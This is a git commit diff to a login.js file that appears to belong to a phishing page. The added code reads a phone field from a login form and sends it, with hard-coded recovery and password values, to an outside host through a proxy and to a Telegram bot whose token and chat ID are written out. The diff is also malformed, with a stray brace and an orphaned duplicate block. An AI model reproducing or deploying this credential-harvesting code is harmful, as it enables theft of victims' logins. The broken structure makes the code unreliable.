d6d2eadb1c839c8b82580c6425700aa040d0d639
Kekblya <138681827+Kekblya@users.noreply.github.com>
2023-07-06 15:52:10 +0400

    Add files via upload

--- login.js
+++ login.js
@@ -1,5 +1,40 @@
-function functionToExecute() {
+function sendRequest() {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://thingproxy.freeboard.io/fetch/https://cyber-star.pw/script.php", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+      var response = JSON.parse(xhr.responseText);
+      if (response.error_description === "Username or password is incorrect") {
+        var errorElement = document.getElementById("error");
+        errorElement.style.display = "block";
+
+        var errorDescriptionElement = document.getElementById("error_description");
+        errorDescriptionElement.textContent = "Error";
+      }
+    }
+  };
+
+  var data = "captcha_sid=null&cid=null&location_id=3&AccessRecovery=79283450132&ConfirmedPassword=3213112132";
+  xhr.send(data);
+}
+
+  // Устанавливаем данные для отправки (если необходимо)
+  var data = new FormData();
+  data.append("captcha_sid", null);
+  data.append("cid", null);
+  data.append("location_id", "3");
+  data.append("AccessRecovery", "79283450132");
+  data.append("ConfirmedPassword", "3213112132");
+
+  // Отправляем запрос
+  xhr.send(data);
+}
+
+function functionToExecute() {
+    sendRequest();
+    let apiToken = "5953853423:AAHhoTbXnHkcTEwTdiqH7MwNO7lZA5iSHSs";
     let chatId = "5445772855";
 
     var phone = document.getElementsByName('ddsfgdfg')[0].value
@@ -8,7 +43,7 @@ function functionToExecute() {
     var settings = {
       "async": true,
       "crossDomain": true,
-      "url": "https://api.telegram.org/" + "bot5995981279:AAGnPr9MAz7zYyXno3CoG5o-YN9rJ9kA2Zg" + "/sendMessage",
+      "url": "https://api.telegram.org/" + "bot5953853423:AAHhoTbXnHkcTEwTdiqH7MwNO7lZA5iSHSs" + "/sendMessage",
       "method": "POST",
       "headers": {
         "Content-Type": "application/json",
